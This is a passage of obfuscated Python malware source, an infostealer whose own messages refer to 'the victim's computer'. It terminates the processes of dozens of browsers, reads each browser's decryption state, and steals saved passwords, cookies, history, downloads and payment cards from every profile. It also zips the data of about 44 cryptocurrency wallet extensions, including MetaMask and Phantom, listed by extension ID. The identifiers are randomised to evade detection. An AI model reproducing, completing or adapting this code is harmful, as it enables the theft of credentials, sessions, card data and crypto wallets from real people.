    def UEMOSNSNZKYGJJDVJYHLIOZBOQPESJBUDMYQKEFLZIEOECFHVOEOLFTXNLNTYQWVCGXTWJZIDQT(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM, DYVIJRUAQQPFSFWAJSLGNNPXJYRDBOQYKZRUMSPZJTXALJKTUDDNFEKGNDNKNXQFZJAALJOULQCBRMBLQRTPPRTRBJVBPGXJFSC, LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB, QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH):
        global DQSEKGAUQVEJFBGYWPFFUGOAZLLKUECQEQRXVDABYRIGISCXFGZLQBNENZOSWIFHJFJWGOUEZEMCYNCLX
        SBEXOJZOOTOAOHGJBIQRKZNWERVEVKZWMVGETWLYJSMNTMFYXQOPWFMKFIXJGLUBPLJHIVOSJKMWEPHBHSURUMPQMUZNVAYRDGW = os.path.join(QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH, 'Extensions')
        DXMZHIKTNQMYPMRYBQHWDYVECICIDLGMVQYDSHSQJBUACEJUBNOKIDFFOIDYDHP = os.path.join("Extensions", LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB)

        if not os.path.exists(SBEXOJZOOTOAOHGJBIQRKZNWERVEVKZWMVGETWLYJSMNTMFYXQOPWFMKFIXJGLUBPLJHIVOSJKMWEPHBHSURUMPQMUZNVAYRDGW):
            return 

        XGQJFYMXAIPMKONZOJAFIXHYFFWUTMRABWNFDCSRPVZWXLNWXSRRXGKBY = [v4r_item for v4r_item in os.listdir(SBEXOJZOOTOAOHGJBIQRKZNWERVEVKZWMVGETWLYJSMNTMFYXQOPWFMKFIXJGLUBPLJHIVOSJKMWEPHBHSURUMPQMUZNVAYRDGW) if os.path.isdir(os.path.join(SBEXOJZOOTOAOHGJBIQRKZNWERVEVKZWMVGETWLYJSMNTMFYXQOPWFMKFIXJGLUBPLJHIVOSJKMWEPHBHSURUMPQMUZNVAYRDGW, v4r_item))]
        
        for v4r_extention in XGQJFYMXAIPMKONZOJAFIXHYFFWUTMRABWNFDCSRPVZWXLNWXSRRXGKBY:
            if "Temp" in v4r_extention:
                continue
            
            DQSEKGAUQVEJFBGYWPFFUGOAZLLKUECQEQRXVDABYRIGISCXFGZLQBNENZOSWIFHJFJWGOUEZEMCYNCLX += 1
            BOKBXDUFPSMUPCYWUIAJTUEPSUOATIDMHMYEKNPGONGVPZUDZPJFSEM = False
            
            for v4r_extension_name, v4r_extension_folder in DYVIJRUAQQPFSFWAJSLGNNPXJYRDBOQYKZRUMSPZJTXALJKTUDDNFEKGNDNKNXQFZJAALJOULQCBRMBLQRTPPRTRBJVBPGXJFSC:
                if v4r_extention == v4r_extension_folder:
                    BOKBXDUFPSMUPCYWUIAJTUEPSUOATIDMHMYEKNPGONGVPZUDZPJFSEM = True
                    
                    PZURVKJKKXPZFPIUYXJYDSTKGSAFMXTCYVXRLBSVMZJVOCJIGBWOFPMADBG = os.path.join(DXMZHIKTNQMYPMRYBQHWDYVECICIDLGMVQYDSHSQJBUACEJUBNOKIDFFOIDYDHP, v4r_extension_name, v4r_extention)
                    
                    XFFCWHOHEBEVDTFPYPUOFNSKKWHTUFNDXDJNKUJLDIHBENMQMNZXBDLEWHTLHGAMVMRCYKGRSGAOCWEEKAGLNXRONNMRHK = os.path.join(SBEXOJZOOTOAOHGJBIQRKZNWERVEVKZWMVGETWLYJSMNTMFYXQOPWFMKFIXJGLUBPLJHIVOSJKMWEPHBHSURUMPQMUZNVAYRDGW, v4r_extention)
                    for v4r_item in os.listdir(XFFCWHOHEBEVDTFPYPUOFNSKKWHTUFNDXDJNKUJLDIHBENMQMNZXBDLEWHTLHGAMVMRCYKGRSGAOCWEEKAGLNXRONNMRHK):
                        WDHHMLUIHYGCTXGTIKIHBBJISIYHHJFNSOCCOZWWEYSSFZJZYWSJLNWEPNAZGAPBWKJGGJTVFGHYFVIDXADSNQCFLHNEOZSRD = os.path.join(XFFCWHOHEBEVDTFPYPUOFNSKKWHTUFNDXDJNKUJLDIHBENMQMNZXBDLEWHTLHGAMVMRCYKGRSGAOCWEEKAGLNXRONNMRHK, v4r_item)
                        
                        if os.path.isdir(WDHHMLUIHYGCTXGTIKIHBBJISIYHHJFNSOCCOZWWEYSSFZJZYWSJLNWEPNAZGAPBWKJGGJTVFGHYFVIDXADSNQCFLHNEOZSRD):
                            for dirpath, dirnames, filenames in os.walk(WDHHMLUIHYGCTXGTIKIHBBJISIYHHJFNSOCCOZWWEYSSFZJZYWSJLNWEPNAZGAPBWKJGGJTVFGHYFVIDXADSNQCFLHNEOZSRD):
                                for filename in filenames:
                                    file_path = os.path.join(dirpath, filename)
                                    arcname = os.path.relpath(file_path, XFFCWHOHEBEVDTFPYPUOFNSKKWHTUFNDXDJNKUJLDIHBENMQMNZXBDLEWHTLHGAMVMRCYKGRSGAOCWEEKAGLNXRONNMRHK)
                                    DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM.write(file_path, os.path.join(PZURVKJKKXPZFPIUYXJYDSTKGSAFMXTCYVXRLBSVMZJVOCJIGBWOFPMADBG, arcname))
                        else:
                            DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM.write(WDHHMLUIHYGCTXGTIKIHBBJISIYHHJFNSOCCOZWWEYSSFZJZYWSJLNWEPNAZGAPBWKJGGJTVFGHYFVIDXADSNQCFLHNEOZSRD, os.path.join(PZURVKJKKXPZFPIUYXJYDSTKGSAFMXTCYVXRLBSVMZJVOCJIGBWOFPMADBG, v4r_item))
                    break

            if not BOKBXDUFPSMUPCYWUIAJTUEPSUOATIDMHMYEKNPGONGVPZUDZPJFSEM:
                NOFREUJIAXRMBFFCFKERKMFFPKDBTNADUODUUOFKFZXAJGKVIVXJNBCJDYUDBMTGMMCYIGG = os.path.join(DXMZHIKTNQMYPMRYBQHWDYVECICIDLGMVQYDSHSQJBUACEJUBNOKIDFFOIDYDHP, "Unknown Extension", v4r_extention)
                
                XFFCWHOHEBEVDTFPYPUOFNSKKWHTUFNDXDJNKUJLDIHBENMQMNZXBDLEWHTLHGAMVMRCYKGRSGAOCWEEKAGLNXRONNMRHK = os.path.join(SBEXOJZOOTOAOHGJBIQRKZNWERVEVKZWMVGETWLYJSMNTMFYXQOPWFMKFIXJGLUBPLJHIVOSJKMWEPHBHSURUMPQMUZNVAYRDGW, v4r_extention)
                for v4r_item in os.listdir(XFFCWHOHEBEVDTFPYPUOFNSKKWHTUFNDXDJNKUJLDIHBENMQMNZXBDLEWHTLHGAMVMRCYKGRSGAOCWEEKAGLNXRONNMRHK):
                    WDHHMLUIHYGCTXGTIKIHBBJISIYHHJFNSOCCOZWWEYSSFZJZYWSJLNWEPNAZGAPBWKJGGJTVFGHYFVIDXADSNQCFLHNEOZSRD = os.path.join(XFFCWHOHEBEVDTFPYPUOFNSKKWHTUFNDXDJNKUJLDIHBENMQMNZXBDLEWHTLHGAMVMRCYKGRSGAOCWEEKAGLNXRONNMRHK, v4r_item)
                    
                    if os.path.isdir(WDHHMLUIHYGCTXGTIKIHBBJISIYHHJFNSOCCOZWWEYSSFZJZYWSJLNWEPNAZGAPBWKJGGJTVFGHYFVIDXADSNQCFLHNEOZSRD):
                        for dirpath, dirnames, filenames in os.walk(WDHHMLUIHYGCTXGTIKIHBBJISIYHHJFNSOCCOZWWEYSSFZJZYWSJLNWEPNAZGAPBWKJGGJTVFGHYFVIDXADSNQCFLHNEOZSRD):
                            for filename in filenames:
                                file_path = os.path.join(dirpath, filename)
                                arcname = os.path.relpath(file_path, XFFCWHOHEBEVDTFPYPUOFNSKKWHTUFNDXDJNKUJLDIHBENMQMNZXBDLEWHTLHGAMVMRCYKGRSGAOCWEEKAGLNXRONNMRHK)
                                DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM.write(file_path, os.path.join(NOFREUJIAXRMBFFCFKERKMFFPKDBTNADUODUUOFKFZXAJGKVIVXJNBCJDYUDBMTGMMCYIGG, arcname))
                    else:
                        DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM.write(WDHHMLUIHYGCTXGTIKIHBBJISIYHHJFNSOCCOZWWEYSSFZJZYWSJLNWEPNAZGAPBWKJGGJTVFGHYFVIDXADSNQCFLHNEOZSRD, os.path.join(NOFREUJIAXRMBFFCFKERKMFFPKDBTNADUODUUOFKFZXAJGKVIVXJNBCJDYUDBMTGMMCYIGG, v4r_item))

    LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB_files = [
        ("Google Chrome",          os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Google", "Chrome", "User Data"),                 "chrome.exe"),
        ("Google Chrome SxS",      os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Google", "Chrome SxS", "User Data"),             "chrome.exe"),
        ("Google Chrome Beta",     os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Google", "Chrome Beta", "User Data"),            "chrome.exe"),
        ("Google Chrome Dev",      os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Google", "Chrome Dev", "User Data"),             "chrome.exe"),
        ("Google Chrome Unstable", os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Google", "Chrome Unstable", "User Data"),        "chrome.exe"),
        ("Google Chrome Canary",   os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Google", "Chrome Canary", "User Data"),          "chrome.exe"),
        ("Microsoft Edge",         os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Microsoft", "Edge", "User Data"),                "msedge.exe"),
        ("Opera",                  os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA, "Opera Software", "Opera Stable"),                "opera.exe"),
        ("Opera GX",               os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA, "Opera Software", "Opera GX Stable"),             "opera.exe"),
        ("Opera Neon",             os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA, "Opera Software", "Opera Neon"),                  "opera.exe"),
        ("Brave",                  os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
        ("Vivaldi",                os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Vivaldi", "User Data"),                          "vivaldi.exe"),
        ("Internet Explorer",      os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Microsoft", "Internet Explorer"),                "iexplore.exe"),
        ("Amigo",                  os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Amigo", "User Data"),                            "amigo.exe"),
        ("Torch",                  os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Torch", "User Data"),                            "torch.exe"),
        ("Kometa",                 os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Kometa", "User Data"),                           "kometa.exe"),
        ("Orbitum",                os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Orbitum", "User Data"),                          "orbitum.exe"),
        ("Cent Browser",           os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "CentBrowser", "User Data"),                      "centbrowser.exe"),
        ("7Star",                  os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "7Star", "7Star", "User Data"),                   "7star.exe"),
        ("Sputnik",                os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Sputnik", "Sputnik", "User Data"),               "sputnik.exe"),
        ("Epic Privacy Browser",   os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Epic Privacy Browser", "User Data"),             "epic.exe"),
        ("Uran",                   os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "uCozMedia", "Uran", "User Data"),                "uran.exe"),
        ("Yandex",                 os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Yandex", "YandexBrowser", "User Data"),          "yandex.exe"),
        ("Yandex Canary",          os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Yandex", "YandexBrowserCanary", "User Data"),    "yandex.exe"),
        ("Yandex Developer",       os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
        ("Yandex Beta",            os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Yandex", "YandexBrowserBeta", "User Data"),      "yandex.exe"),
        ("Yandex Tech",            os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
        ("Yandex SxS",             os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
        ("Iridium",                os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Iridium", "User Data"),                          "iridium.exe"),
        ("Mozilla Firefox",        os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA, "Mozilla", "Firefox", "Profiles"),                "firefox.exe"),
        ("Safari",                 os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA, "Apple Computer", "Safari"),                      "safari.exe"),
    ]

    QKWZXKNQOFVTQGXOQLWFGCHOIVNRZCDSWLHHDGUJRNEXBXCDVKIZQIQHOTECCAEORJFOEUYNHZXAWQTZRWBCYMHEURIZCBNAW = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    DYVIJRUAQQPFSFWAJSLGNNPXJYRDBOQYKZRUMSPZJTXALJKTUDDNFEKGNDNKNXQFZJAALJOULQCBRMBLQRTPPRTRBJVBPGXJFSC = [
        ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
        ("Binance",         "fhbohimaelbohpjbbldcngcnapndodjp"),
        ("Coinbase",        "hnfanknocfeofbddgcijnmhnfnkdnaad"),
        ("Ronin",           "fnjhmkhhmkbjkkabndcnnogagogbneec"),
        ("Trust",           "egjidjbpglichdcondbcbdnbeeppgdph"),
        ("Venom",           "ojggmchlghnjlapmfbnjholfjkiidbch"),
        ("Sui",             "opcgpfmipidbgpenhmajoajpbobppdil"),
        ("Martian",         "efbglgofoippbgcjepnhiblaibcnclgk"),
        ("Tron",            "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
        ("Petra",           "ejjladinnckdgjemekebdpeokbikhfci"),
        ("Pontem",          "phkbamefinggmakgklpkljjmgibohnba"),
        ("Fewcha",          "ebfidpplhabeedpnhjnobghokpiioolj"),
        ("Math",            "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
        ("Coin98",          "aeachknmefphepccionboohckonoeemg"),
        ("Authenticator",   "bhghoamapcdpbohphigoooaddinpkbai"),
        ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
        ("Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
        ("Core",            "agoakfejjabomempkjlepdflaleeobhb"),
        ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
        ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
        ("Solfare",         "bhhhlbepdkbapadjdnnojkbgioiodbic"),
        ("Kaikas",          "jblndlipeogpafnldhgmapagcccfchpi"),
        ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
        ("Yoroi",           "ffnbelfdoeiohenkjibnmadjiehjhajb"),
        ("Guarda",          "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
        ("Jaxx Liberty",    "cjelfplplebdjjenllpjcblmjkfcffne"),
        ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
        ("Oxygen",          "fhilaheimglignddkjgofkcbgekhenbh"),
        ("MEWCX",           "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
        ("Guild",           "nanjmdknhkinifnkgdcggcfnhdaammmj"),
        ("Saturn",          "nkddgncdjgjfcddamfgcmfnlhccnimig"),
        ("TerraStation",    "aiifbnbfobpmeekipheeijimdpnlpgpp"),
        ("HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib"),
        ("Ever",            "cgeeodpfagjceefieflmdfphplkenlfk"),
        ("KardiaChain",     "pdadjkfkgcafgbceimcpbkalnfnepbnk"),
        ("PaliWallet",      "mgffkfbidihjpoaomajlbgchddlicgpn"),
        ("BoltX",           "aodkkagnadcbobfpggfnjeongemjbjca"),
        ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
        ("XDEFI",           "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
        ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
        ("MaiarDEFI",       "dngmlblcodfobpdpecaadgfbcggfjfnm"),
        ("TempleTezos",     "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
        ("XMR.PT",          "eigblbgjknlfbajkfhopmcojidlgcehm")
    ]
    
    try:
        for GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON, BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ, v4r_proc_name in LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB_files:
            for v4r_proc in psutil.process_iter(['pid', 'name']):
                try:
                    if v4r_proc.name().lower() == v4r_proc_name.lower():
                        v4r_proc.terminate()
                except:
                    pass
    except:
        pass

    for GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON, BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ, v4r_proc_name in LIUDXPVLXDQIQYSLGUWIONCHKTSIJMKVWNHELRYJADETUVJLRNEAPKRLULRB_files:
        if not os.path.exists(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ):
            continue

        FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM = EXNPYQCEWBCCFBQLNUXKUAVXUJEKEYSNYBRYNMSTACQJEKSVMSSCKRVQHHBIKGHKZFAEELNKDYQFXNYDHXFY(os.path.join(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ, 'Local State'))
        if not FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM:
            continue

        for v4r_profile in QKWZXKNQOFVTQGXOQLWFGCHOIVNRZCDSWLHHDGUJRNEXBXCDVKIZQIQHOTECCAEORJFOEUYNHZXAWQTZRWBCYMHEURIZCBNAW:
            QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH = os.path.join(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ, v4r_profile)
            if not os.path.exists(QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH):
                continue

        for v4r_profile in QKWZXKNQOFVTQGXOQLWFGCHOIVNRZCDSWLHHDGUJRNEXBXCDVKIZQIQHOTECCAEORJFOEUYNHZXAWQTZRWBCYMHEURIZCBNAW:
            QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH = os.path.join(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ, v4r_profile)
            if not os.path.exists(QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH):
                continue
            
            if "extentions" in OQPXKHAVSGYGAUBGFSLPWCNTUYJRLGKMLQDHYRFUFIJLWCGWAGTBSUUEFHZFLMXAVDXXCPGTPF:
                try: UEMOSNSNZKYGJJDVJYHLIOZBOQPESJBUDMYQKEFLZIEOECFHVOEOLFTXNLNTYQWVCGXTWJZIDQT(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM, DYVIJRUAQQPFSFWAJSLGNNPXJYRDBOQYKZRUMSPZJTXALJKTUDDNFEKGNDNKNXQFZJAALJOULQCBRMBLQRTPPRTRBJVBPGXJFSC, GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON, QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH)
                except: pass
                
            if "passwords" in OQPXKHAVSGYGAUBGFSLPWCNTUYJRLGKMLQDHYRFUFIJLWCGWAGTBSUUEFHZFLMXAVDXXCPGTPF:
                try: ZJHAWTSGCTRQDVFAQLTUHEIKSGGXYXWANKNKLOGZRSPJUVSLQKTQXZHSESBULIGWGH(GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON, QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH, FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM)
                except: pass
            if "cookies" in OQPXKHAVSGYGAUBGFSLPWCNTUYJRLGKMLQDHYRFUFIJLWCGWAGTBSUUEFHZFLMXAVDXXCPGTPF:
                try: IXLUGFXHJQYSFQLOSOPYJUTHQYHNLUDNWTVSVNPKLSNAQVUQWLKFGFYAMMLVWIWPPUGKPLJHBGDITEG(GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON, QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH, FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM)
                except: pass
            if "history" in OQPXKHAVSGYGAUBGFSLPWCNTUYJRLGKMLQDHYRFUFIJLWCGWAGTBSUUEFHZFLMXAVDXXCPGTPF:
                try: IZGLNUMWTMUJAWVLWKESZQPBCQFXULNFYRGHQLFAQBOWHYROVXVRQWM(GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON, QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH)
                except: pass
            if "downloads" in OQPXKHAVSGYGAUBGFSLPWCNTUYJRLGKMLQDHYRFUFIJLWCGWAGTBSUUEFHZFLMXAVDXXCPGTPF:
                try: VSLTNYQMPKPPQTORURQTGJYCBBJCMZJBKVSJYVBTBCVBYCRRSTKGPQYGJAABDMEIDDTAHR(GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON, QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH)
                except: pass
            if "cards" in OQPXKHAVSGYGAUBGFSLPWCNTUYJRLGKMLQDHYRFUFIJLWCGWAGTBSUUEFHZFLMXAVDXXCPGTPF:
                try: YOTKYAEMGJDHGBXYJVDDQQKCXPJWPHANVEPWYDVEAQTDNCIVBGLOKWTGWZVUSZPOZKGDMSHQVEOVZTRRDZMCEELAAT(GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON, QSGRHOAPVRCBHQAAKDUTGUKFZGYVAYTQPRJNUZIQILOKSWZQUOVDOAZAJCPIYQGEMUVQFURKGXZNABUJSZWTBBCSDYEXSHDH, FCLEQHINZFJLWCTMAFKIWHKAHZCJKRNQTZKXJHAXUAMYJSWMNQPKEDPPFOJRYZWBIQSHCM)
                except: pass

            if GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON not in OAGPVBKAUAIPTVDECBYEQJPDSWQWYYPVWPEIYZAIBIQEPDFQPCAZOZFDIFLUWDILT:
                OAGPVBKAUAIPTVDECBYEQJPDSWQWYYPVWPEIYZAIBIQEPDFQPCAZOZFDIFLUWDILT.append(GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON)

    if "passwords" in OQPXKHAVSGYGAUBGFSLPWCNTUYJRLGKMLQDHYRFUFIJLWCGWAGTBSUUEFHZFLMXAVDXXCPGTPF:
        if not BWITGKALYLVOLFFDCXBOVLNELIKAPKXJPBBDGCVOHPTNVWDZRYZWEJSZCGRXMOVDBIPQPPVJQAISVDVPAT:
            BWITGKALYLVOLFFDCXBOVLNELIKAPKXJPBBDGCVOHPTNVWDZRYZWEJSZCGRXMOVDBIPQPPVJQAISVDVPAT.append("No passwords was saved on the victim's computer.")
        BWITGKALYLVOLFFDCXBOVLNELIKAPKXJPBBDGCVOHPTNVWDZRYZWEJSZCGRXMOVDBIPQPPVJQAISVDVPAT = "\n".join(BWITGKALYLVOLFFDCXBOVLNELIKAPKXJPBBDGCVOHPTNVWDZRYZWEJSZCGRXMOVDBIPQPPVJQAISVDVPAT)
    if "cookies" in OQPXKHAVSGYGAUBGFSLPWCNTUYJRLGKMLQDHYRFUFIJLWCGWAGTBSUUEFHZFLMXAVDXXCPGTPF:
        if not MWYXHIGSGTMDTBWJLTYXXIUPVREOJNLXCYLIVDXTNPLMOZPSLYHKCAAHAMVAOAYBDW:
            MWYXHIGSGTMDTBWJLTYXXIUPVREOJNLXCYLIVDXTNPLMOZPSLYHKCAAHAMVAOAYBDW.append("No cookies was saved on the victim's computer.")
